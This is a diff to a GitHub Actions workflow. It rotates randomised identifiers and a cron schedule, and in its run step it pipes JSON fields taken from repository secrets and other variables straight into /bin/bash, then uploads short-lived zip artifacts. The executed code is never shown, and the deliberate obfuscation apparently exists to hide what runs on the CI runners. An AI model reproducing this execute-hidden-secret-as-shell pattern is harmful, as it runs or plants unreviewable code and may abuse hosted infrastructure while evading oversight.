@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '1 4,10,16,22 * * *'
+    - cron: '11 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -16,18 +16,18 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          u741: ${{ secrets.u741 }}
+          clpn06189: ${{ secrets.clpn06189 }}
         run: |
-          printf '%s' "$u741" | jq -r .tq875 | /bin/bash
-          printf '%s' "$rnxup64" | jq -r .md7 | /bin/bash
-          printf '%s' "$ootz43" | jq -r .pwsw639 | /bin/bash
-          printf '%s' "$v3229" | jq -r .xstb1 | /bin/bash
-          echo $adfr77658 | jq -r .lm157 | /bin/bash
-          printf '%s' "$pwz0" | jq -r .w2653 | /bin/bash
+          printf '%s' "$clpn06189" | jq -r .xccln765 | /bin/bash
+          printf '%s' "$z13652" | jq -r .bqecp904 | /bin/bash
+          echo $ox70143 | jq -r .w539 | /bin/bash
+          printf '%s' "$shzuz4" | jq -r .xu3502 | /bin/bash
+          echo $s5 | jq -r .nep4834 | /bin/bash
+          printf '%s' "$lobn573" | jq -r .xpjp36390 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: F4GoLvzr
+          name: zyRRjiCU
           path: "*.zip"
           retention-days: 1
